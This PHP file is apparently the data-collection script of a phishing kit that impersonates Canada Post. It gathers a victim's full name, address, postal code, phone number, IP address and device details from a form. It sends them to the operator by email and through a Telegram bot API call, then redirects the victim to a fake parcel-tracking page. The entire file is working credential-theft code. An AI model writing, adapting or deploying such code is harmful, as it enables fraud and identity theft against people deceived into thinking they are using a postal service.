<?php

include "../config.php";
include "../assets/get.php";


$message .= "📮 ################ Canada Post ################📮\n";
$message .= "\n";
$message .= "Full Name : ".$_POST['first_name']." ".$_POST['last_name']."\n";
$message .= "\n";
$message .= "Address : ".$_POST['address_1']."\n";
$message .= "Address : ".$_POST['address_2']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['province']."\n";
$message .= "Country : ".$_POST['country']."\n";
$message .= "Zip code : ".$_POST['postal_code']."\n";
$message .= "\n";
$message .= "Phone : ".$_POST['phone']."\n";
$message .= "\n";
$message .= "################# IP #################\n";
$message .= "IP Address : https://www.whatismyip.com/ip/" . htmlspecialchars($_SERVER['REMOTE_ADDR']) . "\n";
$message .= "System : " . $os ."\n";
$message .= "Browser : " . $browser ."\n";
$message .= "Device Name : " . $deviceName ."\n";
$message .= "📮 ################ Canada Post ################📮\n";
$message .= "\n©️ Mr900 | Telegram @mr900com\n"; // Copyright in the message
$subject = "Billing | Canada Post |";
$headers = 'From: Canada_Post' . "\r\n";

@mail($Email,$subject,$message,$headers);

@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

	header('Location: ../sms.php?action=track&tracknumbers=QQ767123987CA');
	
?>